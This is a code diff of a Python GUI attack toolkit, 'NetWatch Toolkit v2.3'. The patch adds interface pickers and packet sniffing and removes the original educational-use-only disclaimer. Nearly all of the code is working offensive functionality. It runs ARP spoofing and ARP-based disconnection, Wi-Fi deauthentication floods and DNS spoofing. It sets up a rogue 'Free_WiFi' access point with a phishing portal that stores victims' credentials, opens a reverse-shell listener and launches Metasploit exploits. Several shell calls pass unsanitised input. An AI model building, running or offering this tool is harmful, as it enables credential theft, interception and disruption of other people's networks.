@@ -1,23 +1,10 @@
 #!/usr/bin/env python3
 """
-NetWatch Toolkit v2  (2.3)
-Author: wickedNull aka Null_Lyfe
+NetWatch Toolkit v2.3
+Author: Niko DeRuise
 
 USAGE:
-    sudo python3 netwatchDev.py
-
-REQUIREMENTS:
-    - Python 3.x
-    - nmap
-    - scapy
-    - tkinter
-    - hostapd, dnsmasq
-    - netcat (nc)
-    - mitmproxy, iptables, tcpdump, iftop
-    - metasploit-framework (optional for exploit launcher)
-
-DISCLAIMER:
-    For educational and authorized use only.
+    sudo python3 netwatch.py
 """
 
 import os
@@ -27,8 +14,8 @@ import time
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
 from tkinter import *
-from tkinter import ttk, filedialog, messagebox
-from scapy.all import ARP, Ether, srp, send, RadioTap, Dot11, Dot11Deauth, sendp
+from tkinter import ttk, filedialog
+from scapy.all import ARP, Ether, srp, send, sniff, wrpcap, RadioTap, Dot11, Dot11Deauth, sendp
 
 # === Globals ===
 evil_dir = "netwatch_portal"
@@ -37,7 +24,10 @@ portal_server = None
 evil_processes = []
 spoofing = False
 kicking = False
+capturing = False
+sniff_thread = None
 
+# === Helper Functions ===
 def is_root():
     return os.geteuid() == 0
 
@@ -47,10 +37,22 @@ def get_mac(ip):
         return r[Ether].src
     return None
 
-def get_default_interface():
-    return subprocess.getoutput("ip route | grep default | awk '{print $5}'")
+def list_wireless_interfaces():
+    interfaces = subprocess.getoutput("ls /sys/class/net").split()
+    return [iface for iface in interfaces if os.path.isdir(f"/sys/class/net/{iface}/wireless")]
 
-# === Evil Portal HTTP Server ===
+def list_monitor_interfaces():
+    output = subprocess.getoutput("iw dev")
+    interfaces = []
+    blocks = output.strip().split("Interface ")
+    for block in blocks[1:]:
+        lines = block.strip().splitlines()
+        iface = lines[0].strip()
+        if any("type monitor" in line for line in lines):
+            interfaces.append(iface)
+    return interfaces
+
+# === HTTP Credential Phishing Server ===
 class PortalHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         path = os.path.join(evil_dir, "index.html")
@@ -91,7 +93,7 @@ if not is_root():
     exit()
 
 root = Tk()
-root.title("NetWatch Toolkit v2")
+root.title("NetWatch Toolkit v2.3")
 root.geometry("1200x720")
 style = ttk.Style()
 style.theme_use("clam")
@@ -111,8 +113,8 @@ def create_tab(title):
     scrollbar.pack(side=RIGHT, fill=Y)
     output.pack(expand=1, fill="both")
     return tab, output
-	
-	# === Nmap Scanner ===
+    
+    # === Tab 1: Nmap Scanner ===
 tab1, nmap_output = create_tab("Nmap")
 Label(tab1, text="Target IP/Range:", bg="#1e1e2e", fg="#0ff").pack()
 nmap_entry = Entry(tab1); nmap_entry.pack()
@@ -123,7 +125,7 @@ def run_nmap():
         nmap_output.insert(END, result + "\n")
 Button(tab1, text="Scan", command=lambda: threading.Thread(target=run_nmap).start()).pack()
 
-# === ARP Scanner ===
+# === Tab 2: ARP Scan ===
 tab2, arp_output = create_tab("ARP Scan")
 Label(tab2, text="Network CIDR:", bg="#1e1e2e", fg="#0ff").pack()
 arp_entry = Entry(tab2); arp_entry.pack()
@@ -134,7 +136,7 @@ def arp_scan():
         arp_output.insert(END, f"{r.psrc} - {r.hwsrc}\n")
 Button(tab2, text="Scan", command=lambda: threading.Thread(target=arp_scan).start()).pack()
 
-# === ARP Spoofing ===
+# === Tab 3: ARP Spoof ===
 tab3, spoof_output = create_tab("ARP Spoof")
 Label(tab3, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
 spoof_target = Entry(tab3); spoof_target.pack()
@@ -156,7 +158,7 @@ def stop_spoof(): global spoofing; spoofing = False
 Button(tab3, text="Start", command=start_spoof).pack()
 Button(tab3, text="Stop", command=stop_spoof).pack()
 
-# === ARP Kick ===
+# === Tab 4: ARP Kick ===
 tab4, kick_output = create_tab("ARP Kick")
 Label(tab4, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
 kick_target = Entry(tab4); kick_target.pack()
@@ -178,7 +180,7 @@ def stop_kick(): global kicking; kicking = False
 Button(tab4, text="Start Kick", command=start_kick).pack()
 Button(tab4, text="Stop Kick", command=stop_kick).pack()
 
-# === Traceroute ===
+# === Tab 5: Traceroute ===
 tab5, trace_output = create_tab("Traceroute")
 Label(tab5, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
 trace_entry = Entry(tab5); trace_entry.pack()
@@ -187,7 +189,7 @@ def run_trace():
     trace_output.insert(END, result + "\n")
 Button(tab5, text="Run Trace", command=lambda: threading.Thread(target=run_trace).start()).pack()
 
-# === Reverse Shell ===
+# === Tab 6: Reverse Shell ===
 tab6, shell_output = create_tab("Reverse Shell")
 Label(tab6, text="LPORT (e.g. 4444):", bg="#1e1e2e", fg="#0ff").pack()
 shell_lport = Entry(tab6); shell_lport.insert(0, "4444"); shell_lport.pack()
@@ -197,20 +199,28 @@ def start_listener():
     os.system(f"x-terminal-emulator -e 'nc -lvnp {port}'")
 Button(tab6, text="Start Listener", command=lambda: threading.Thread(target=start_listener).start()).pack()
 
-# === Evil Portal ===
+# === Tab 7: Evil Portal ===
 tab7, portal_output = create_tab("Evil Portal")
 Label(tab7, text="SSID:", bg="#1e1e2e", fg="#0ff").pack()
 ep_ssid = Entry(tab7); ep_ssid.insert(0, "Free_WiFi"); ep_ssid.pack()
-Label(tab7, text="Interface (AP Capable):", bg="#1e1e2e", fg="#0ff").pack()
-ep_iface = Entry(tab7); ep_iface.insert(0, "wlan0"); ep_iface.pack()
+
+Label(tab7, text="Select Wireless Interface:", bg="#1e1e2e", fg="#0ff").pack()
+ep_wireless_ifaces = list_wireless_interfaces()
+if not ep_wireless_ifaces:
+    ep_wireless_ifaces = ["No wireless iface"]
+ep_iface_var = StringVar(tab7)
+ep_iface_var.set(ep_wireless_ifaces[0])
+OptionMenu(tab7, ep_iface_var, *ep_wireless_ifaces).pack()
+
 def choose_html():
     file = filedialog.askopenfilename()
     if file:
         with open(file, "r") as src, open(os.path.join(evil_dir, "index.html"), "w") as dst:
             dst.write(src.read())
 Button(tab7, text="Select HTML Page", command=choose_html).pack()
+
 def start_evil_ap():
-    ssid, iface = ep_ssid.get(), ep_iface.get()
+    ssid, iface = ep_ssid.get(), ep_iface_var.get()
     hostapd_conf = f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
     dns_conf = f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.100,12h\naddress=/#/10.0.0.1"
     os.chdir(evil_dir)
@@ -229,6 +239,7 @@ def start_evil_ap():
     evil_processes.extend([h, d])
     threading.Thread(target=start_portal_server, daemon=True).start()
     portal_output.insert(END, f"[+] Evil AP '{ssid}' running on {iface}\n")
+
 def stop_evil_ap():
     for p in evil_processes:
         try: p.terminate()
@@ -237,58 +248,117 @@ def stop_evil_ap():
     os.system("iptables -t nat -F && iptables -F")
     stop_portal_server()
     portal_output.insert(END, "[x] Evil Portal stopped\n")
+
 Button(tab7, text="Start Evil Portal", command=start_evil_ap).pack()
 Button(tab7, text="Stop Evil Portal", command=stop_evil_ap).pack()
 Button(tab7, text="Show Captured Creds", command=lambda: portal_output.insert(END, open(os.path.join(evil_dir, "credentials.txt")).read() if os.path.exists(os.path.join(evil_dir, "credentials.txt")) else "No credentials yet\n")).pack()
 
-# === Deauth Attack ===
+# === Tab 8: Deauth Attack ⚠️ ===
 tab8, deauth_output = create_tab("Deauth Attack ⚠️")
-Label(tab8, text="Monitor Interface:", bg="#1e1e2e", fg="#0ff").pack()
-deauth_iface = Entry(tab8); deauth_iface.pack()
+Label(tab8, text="Select Monitor Interface:", bg="#1e1e2e", fg="#0ff").pack()
+deauth_monitor_list = list_monitor_interfaces()
+if not deauth_monitor_list:
+    deauth_monitor_list = ["No monitor iface"]
+deauth_iface_var = StringVar(tab8)
+deauth_iface_var.set(deauth_monitor_list[0])
+OptionMenu(tab8, deauth_iface_var, *deauth_monitor_list).pack()
+
 Label(tab8, text="Target MAC:", bg="#1e1e2e", fg="#0ff").pack()
 target_mac = Entry(tab8); target_mac.pack()
 Label(tab8, text="AP MAC:", bg="#1e1e2e", fg="#0ff").pack()
 ap_mac = Entry(tab8); ap_mac.pack()
+
 def deauth():
     pkt = RadioTap()/Dot11(addr1=target_mac.get(), addr2=ap_mac.get(), addr3=ap_mac.get())/Dot11Deauth()
-    sendp(pkt, iface=deauth_iface.get(), count=100, inter=0.1, verbose=0)
+    sendp(pkt, iface=deauth_iface_var.get(), count=100, inter=0.1, verbose=0)
     deauth_output.insert(END, "Deauth packets sent.\n")
+
 Button(tab8, text="Send Deauth", command=lambda: threading.Thread(target=deauth).start()).pack()
 
-# === DNS Spoofing ===
+# === Tab 9: DNS Spoofing ===
 tab9, dns_output = create_tab("DNS Spoofing")
 Label(tab9, text="Spoofed Domain:", bg="#1e1e2e", fg="#0ff").pack()
 dns_domain = Entry(tab9); dns_domain.pack()
 Label(tab9, text="Redirect to IP:", bg="#1e1e2e", fg="#0ff").pack()
 dns_ip = Entry(tab9); dns_ip.pack()
+
 def dns_spoof():
     rule = f"address=/{dns_domain.get()}/{dns_ip.get()}"
+    os.makedirs("dnsmasq.d", exist_ok=True)
     with open("dnsmasq.d/spoof.conf", "w") as f: f.write(rule)
     os.system("systemctl restart dnsmasq")
     dns_output.insert(END, f"DNS spoofing {dns_domain.get()} → {dns_ip.get()}\n")
+
 Button(tab9, text="Spoof Domain", command=dns_spoof).pack()
 
-# === Bandwidth Monitor ===
+# === Tab 10: Bandwidth Monitor ===
 tab10, bw_output = create_tab("Bandwidth Monitor")
 def run_iftop():
     bw_output.insert(END, "Launching iftop (requires terminal)...\n")
     os.system("x-terminal-emulator -e 'iftop'")
 Button(tab10, text="Launch iftop", command=lambda: threading.Thread(target=run_iftop).start()).pack()
 
-# === Packet Capture ===
+# === Tab 11: Packet Capture ===
 tab11, pcap_output = create_tab("Packet Capture")
-Label(tab11, text="Interface:", bg="#1e1e2e", fg="#0ff").pack()
-pcap_iface = Entry(tab11); pcap_iface.insert(0, "eth0"); pcap_iface.pack()
+
+Label(tab11, text="Select Monitor Interface:", bg="#1e1e2e", fg="#0ff").pack()
+monitor_ifaces = list_monitor_interfaces()
+if not monitor_ifaces:
+    monitor_ifaces = ["No monitor mode iface"]
+selected_iface = StringVar(tab11)
+selected_iface.set(monitor_ifaces[0])
+OptionMenu(tab11, selected_iface, *monitor_ifaces).pack()
+
 Label(tab11, text="Output File:", bg="#1e1e2e", fg="#0ff").pack()
 pcap_file = Entry(tab11); pcap_file.insert(0, "capture.pcap"); pcap_file.pack()
-def capture_packets():
-    iface = pcap_iface.get()
-    out = pcap_file.get()
-    pcap_output.insert(END, f"Capturing packets on {iface} → {out}\n")
-    os.system(f"x-terminal-emulator -e 'tcpdump -i {iface} -w {out}'")
-Button(tab11, text="Start Capture", command=lambda: threading.Thread(target=capture_packets).start()).pack()
 
-# === MAC Changer ===
+Label(tab11, text="Enable Monitor Mode on Interface:", bg="#1e1e2e", fg="#0ff").pack()
+mon_iface = Entry(tab11); mon_iface.insert(0, "wlan0"); mon_iface.pack()
+
+def enable_monitor_mode():
+    iface = mon_iface.get()
+    subprocess.call(f"ip link set {iface} down", shell=True)
+    subprocess.call(f"iw {iface} set monitor control", shell=True)
+    subprocess.call(f"ip link set {iface} up", shell=True)
+    pcap_output.insert(END, f"[+] Enabled monitor mode on {iface}\n")
+    new_list = list_monitor_interfaces()
+    menu = selected_iface_menu["menu"]
+    menu.delete(0, "end")
+    for name in new_list:
+        menu.add_command(label=name, command=lambda value=name: selected_iface.set(value))
+    selected_iface.set(new_list[0] if new_list else "No monitor mode iface")
+
+selected_iface_menu = OptionMenu(tab11, selected_iface, *monitor_ifaces)
+selected_iface_menu.pack()
+
+def sniff_packets():
+    global capturing
+    iface = selected_iface.get()
+    out = pcap_file.get()
+    if iface == "No monitor mode iface":
+        pcap_output.insert(END, "[!] No valid interface selected.\n")
+        return
+    pcap_output.insert(END, f"[+] Starting capture on {iface}...\n")
+    packets = sniff(iface=iface, prn=lambda x: pcap_output.insert(END, f"{x.summary()}\n"), stop_filter=lambda x: not capturing)
+    wrpcap(out, packets)
+    pcap_output.insert(END, f"[✓] Capture saved to {out}\n")
+
+def start_capture():
+    global capturing, sniff_thread
+    capturing = True
+    sniff_thread = threading.Thread(target=sniff_packets)
+    sniff_thread.start()
+
+def stop_capture():
+    global capturing
+    capturing = False
+    pcap_output.insert(END, "[x] Capture stopped.\n")
+
+Button(tab11, text="Enable Monitor Mode", command=enable_monitor_mode).pack()
+Button(tab11, text="Start Capture", command=start_capture).pack()
+Button(tab11, text="Stop Capture", command=stop_capture).pack()
+
+# === Tab 12: MAC Changer ===
 tab12, mac_output = create_tab("MAC Changer")
 Label(tab12, text="Interface:", bg="#1e1e2e", fg="#0ff").pack()
 mac_iface = Entry(tab12); mac_iface.insert(0, "eth0"); mac_iface.pack()
@@ -304,7 +374,7 @@ def change_mac():
     mac_output.insert(END, f"MAC changed on {iface}\n")
 Button(tab12, text="Change MAC", command=lambda: threading.Thread(target=change_mac).start()).pack()
 
-# === Firewall Manager ===
+# === Tab 13: Firewall Rules ===
 tab13, fw_output = create_tab("Firewall")
 Label(tab13, text="iptables Rule:", bg="#1e1e2e", fg="#0ff").pack()
 fw_rule = Entry(tab13); fw_rule.pack()
@@ -314,9 +384,9 @@ def add_rule():
     fw_output.insert(END, f"Rule added: iptables {cmd}\n")
 Button(tab13, text="Add Rule", command=add_rule).pack()
 
-# === Exploit Launcher (Metasploit) ===
+# === Tab 14: Exploit Launcher ===
 tab14, msf_output = create_tab("Exploit Launcher")
-Label(tab14, text="Exploit Path (e.g. exploit/windows/smb/ms17_010_eternalblue):", bg="#1e1e2e", fg="#0ff").pack()
+Label(tab14, text="Exploit Path:", bg="#1e1e2e", fg="#0ff").pack()
 msf_exploit = Entry(tab14); msf_exploit.pack()
 Label(tab14, text="RHOST:", bg="#1e1e2e", fg="#0ff").pack()
 msf_rhost = Entry(tab14); msf_rhost.pack()
@@ -337,7 +407,7 @@ exploit
     os.system("x-terminal-emulator -e 'msfconsole -r msf.rc'")
 Button(tab14, text="Launch Exploit", command=lambda: threading.Thread(target=launch_msf).start()).pack()
 
-# === Session Log Export ===
+# === Tab 15: Log Export ===
 tab15, log_output = create_tab("Export Logs")
 Label(tab15, text="Export File:", bg="#1e1e2e", fg="#0ff").pack()
 log_file = Entry(tab15); log_file.insert(0, "netwatch_session.log"); log_file.pack()
@@ -354,7 +424,7 @@ def export_logs():
     log_output.insert(END, f"Session exported to {log_file.get()}\n")
 Button(tab15, text="Export", command=export_logs).pack()
 
-# === Reset Tab ===
+# === Tab 16: Reset Toolkit ===
 tab16, reset_output = create_tab("Reset")
 def reset_all():
     for tab in notebook.winfo_children():
@@ -364,7 +434,7 @@ def reset_all():
     reset_output.insert(END, "[✓] All fields cleared\n")
 Button(tab16, text="Reset Fields", command=reset_all).pack()
 
-# === Session Manager ===
+# === Tab 17: Session Manager ===
 tab17, session_output = create_tab("Session Manager")
 def save_session():
     with open("netwatch_session.txt", "w") as f:
@@ -394,6 +464,5 @@ def load_session():
 Button(tab17, text="Save Session", command=save_session).pack()
 Button(tab17, text="Load Session", command=load_session).pack()
 
-# === Run GUI ===
+# === Launch the Toolkit ===
 root.mainloop()
-
